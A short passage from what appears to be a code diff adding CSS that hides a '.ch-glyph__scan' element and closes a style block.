+    .ch-glyph__scan      { display: none; }
+  }
+</style>
